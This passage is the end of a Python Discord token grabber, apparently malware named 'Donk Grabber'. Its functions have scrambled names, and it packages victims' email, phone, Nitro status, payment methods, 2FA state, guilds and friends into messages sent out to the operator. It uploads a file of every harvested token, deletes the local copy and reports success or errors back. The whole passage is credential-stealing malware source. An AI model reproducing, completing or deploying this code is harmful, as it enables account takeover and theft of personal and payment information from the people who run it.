                    {"name": "📧 Email", "value": f"```{token_info['email']}```", "inline": True},
                    {"name": "📞 Phone", "value": f"```{token_info['phone']}```", "inline": True},
                    {"name": "💎 Nitro", "value": f"```{token_info['nitro']}```", "inline": True},
                    {"name": "💳 Payment Methods", "value": f"```{token_info['payment_methods']}```", "inline": True},
                    {"name": "🔒 2FA", "value": f"```{'Enabled' if token_info['mfa'] else 'Disabled'}```", "inline": True},
                ]
            }]
        }
        
        if token_info['hq_guilds']:
            token_embed["embeds"][0]["fields"].append({
                "name": "🏰 HQ Guilds",
                "value": "\n".join(token_info['hq_guilds'][:3]),
                "inline": False
            })
        
        if token_info['hq_friends']:
            token_embed["embeds"][0]["fields"].append({
                "name": "🤝 HQ Friends",
                "value": "\n".join(token_info['hq_friends'][:5]),
                "inline": False
            })
        
        u8j2d1(token_embed)
    
    # Send file with all tokens
    if all_data["tokens"]:
        token_file = q9m3p7(list(set(all_data["tokens"])), "donk_all_tokens")
        w2k9r4(token_file, "All Discord Tokens")
        os.remove(token_file)
    
    # Send completion notification
    completion_embed = {
        "embeds": [{
            "title": "✅ Donk Grabber - Execution Completed",
            "description": "All data collection finished successfully!",
            "color": 0x00ff00,
            "timestamp": datetime.utcnow().isoformat() + "Z"
        }]
    }
    u8j2d1(completion_embed)

if __name__ == "__main__":
    try:
        main_execution()
    except Exception as e:
        # Error reporting
        error_embed = {
            "embeds": [{
                "title": "❌ Donk Grabber - Error",
                "description": f"An error occurred during execution:\n```{str(e)}```",
                "color": 0xff0000,
                "timestamp": datetime.utcnow().isoformat() + "Z"
            }]
        }
        try:
            u8j2d1(error_embed)
        except:
            pass